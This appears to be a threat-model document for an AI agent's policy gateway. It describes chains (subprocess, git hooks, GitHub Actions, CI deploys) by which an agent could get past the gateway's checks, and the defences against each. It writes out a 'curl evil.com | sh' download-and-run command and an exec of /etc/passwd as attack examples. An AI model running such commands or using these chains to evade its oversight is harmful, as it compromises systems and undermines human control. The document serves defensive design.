# Recursive Execution Threats

Recursive execution occurs when an agent triggers a chain of
executions that eventually bypass the gateway. This is one of the
more subtle threat vectors because individual steps may all be
allowed by policy.

## Attack Patterns

### 1. Shell → Subprocess Chain

```
Agent → shell:python -c "import subprocess; subprocess.run(['bash', '-c', 'curl evil.com | sh'])"
  → Python interpreter (allowed)
    → bash (allowed? maybe not)
      → curl (allowed? maybe not)
        → sh (DANGER)
```

**Defense:** The shell executor is the only entry point for
subprocesses. Subprocesses do NOT route back through the gateway.
Mitigation: restrict the shell executor's permissions, use a
sandboxed executor (`shell.sandboxed`) for untrusted commands.

### 2. Git → Hook Chain

```
Agent → git.push (triggers a server-side hook)
  → hook runs on the git server
    → hook invokes CI/CD
      → CI/CD deploys code
        → deployed code has a backdoor
```

**Defense:** The gateway's `git.push` action verifies the lease
allows the push. Server-side hooks are out of the gateway's
control but are limited to the git server's permissions. Use
git server-side hook review and restricted permissions.

### 3. GitHub → Action Chain

```
Agent → github.pr (creates a PR)
  → PR triggers GitHub Actions
    → Action runs untrusted code
      → Action has access to repo secrets
        → Exfiltrated secrets
```

**Defense:** The gateway's `github.pr` action can require
approval for PRs that would trigger CI. Combined with GitHub
branch protection, this limits the attack surface.

### 4. CI → Deploy Chain

```
Agent → ci.trigger
  → CI builds and deploys
    → Deployed code has elevated permissions
      → Production access via legitimate deploy
```

**Defense:** The gateway's `ci.trigger` action requires approval
for production deployments. Combined with environment-specific
policies, this limits the attack surface.

### 5. Eval-Based Code Execution

```
Agent → shell:python -c "exec(compile(open('/etc/passwd').read(), '<string>', 'exec'))"
```

**Defense:** The shell executor is rate-limited and audited.
Risky patterns are escalated. Long-running executions are
monitored and can be killed by the operator.

## Defense Architecture

```
┌────────────────────────────────────────────────────────────┐
│                    AGENT PROCESS                            │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Agent Code (LLM-driven)                              │  │
│  └─────┬────────────────────────────────────────────────┘  │
│        │ (HTTP request to gateway)                          │
└────────┼────────────────────────────────────────────────────┘
         │
         ▼
┌────────────────────────────────────────────────────────────┐
│                    GATEWAY (trusted)                         │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Action Request → Policy Eval → Decision             │  │
│  └─────┬────────────────────────────────────────────────┘  │
│        │ (if allow)                                          │
└────────┼────────────────────────────────────────────────────┘
         │
         ▼
┌────────────────────────────────────────────────────────────┐
│                    EXECUTOR (semi-trusted)                   │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  ShellExecutor / DirectExecutor / GitExecutor        │  │
│  │  - Runs in appArmor/seccomp/Firecracker sandbox       │  │
│  │  - Cannot invoke other executors without going        │  │
│  │    through the gateway                               │  │
│  └──────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────┘
```

The key invariant: **the executor cannot invoke another executor
without going through the gateway**. The executor process is
isolated and has no special permissions to call the gateway
without proper authentication.

## Sandboxed Execution

For untrusted code, use the `shell.sandboxed` action type:

```json
{
  "action_type": "shell.sandboxed",
  "resource": "shell:python untrusted_script.py",
  "environment": "dev"
}
```

The sandboxed executor runs the command inside a Firecracker
microVM with no network access, no host filesystem access, and
strict resource limits. Even if the script is malicious, it
cannot escape the microVM.

## Testing

The recursive execution defense is tested via:

1. **Unit tests** in `runtime/gateway/internal/execution/` verify
   that executors cannot bypass the gateway.
2. **Integration tests** in `runtime/gateway/tests/integration/`
   verify that the shell interceptor routes through the gateway.
3. **e2e tests** in `runtime/gateway/cmd/e2e/` verify the full
   flow under adversarial conditions.

## Limitations

- **The executor inherits the host's kernel.** Even in a
  Firecracker microVM, kernel-level vulnerabilities could
  potentially be exploited. Mitigation: keep the host kernel
  patched.
- **Side-channel attacks across microVM boundaries.** Some
  side channels (e.g., cache timing) can cross microVM
  boundaries. Mitigation: use CPU mitigations (Spectre/Meltdown
  patches).
- **Compromise of the gateway itself.** If the gateway
  binary is compromised, all bets are off. Mitigation: defense
  in depth at the application layer, signed binaries, secure
  boot.

## Related Documents

- [Attack Vectors](attack_vectors.md)
- [Runtime Containment](runtime_containment.md) — defense layers
- [Trust Boundaries](trust_boundaries.md)
